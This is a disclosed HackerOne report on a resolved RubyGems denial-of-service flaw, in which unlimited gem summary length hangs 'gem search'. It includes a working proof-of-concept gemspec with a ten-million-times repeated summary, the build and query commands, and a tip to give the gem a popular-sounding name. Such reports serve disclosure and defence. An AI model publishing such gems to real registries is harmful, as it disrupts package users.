---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '243003'
original_report_id: '243003'
title: No limit of summary length allows Denail of Service
weakness: Uncontrolled Resource Consumption
team_handle: rubygems
created_at: '2017-06-25T07:53:33.914Z'
disclosed_at: '2017-08-31T23:19:29.517Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
asset_identifier: https://github.com/rubygems/rubygems
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# No limit of summary length allows Denail of Service

## Metadata

- HackerOne Report ID: 243003
- Weakness: Uncontrolled Resource Consumption
- Program: rubygems
- Disclosed At: 2017-08-31T23:19:29.517Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Currently, there is no limit for summary length.  I think, pushing a gem whose summary is huge, will make `gem search` unavailable.

This is not Arbitrary Code Execution, but really easy to attack.  According to CVSS v3.0 Calculator, the severity is High (7.5).

## How to attack

1) An attacker creates a gem with huge summary string, and push it to rubygems.org.
2) A victim runs `gem search -d <substring-of-the-name-of-the-gem>`, but it will give no response.

It may be good for the gem name to include a frequently-searched keyword, such as "foo-rails-bar" or "foo-sinatra-bar".

## Proof of concept

1) Prepare the following gemspec.

~~~~
Gem::Specification.new do |spec|
  spec.name     = "huge-summary"
  spec.version  = "0.0.1"
  spec.authors  = ["Yusuke Endoh"]
  spec.email    = ["mame@ruby-lang.org"]
  spec.summary  = "foo" * 10000000
  spec.homepage = "http://example.com/"
  spec.license  = "MIT"
end
~~~~

2) Run the following commands

~~~~
gem build huge-summary.gemspec
gem install huge-summary-0.0.1.gem
~~~~

3) Run the following command.

~~~~
gem query huge-summary -d
~~~~

It will not answer.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
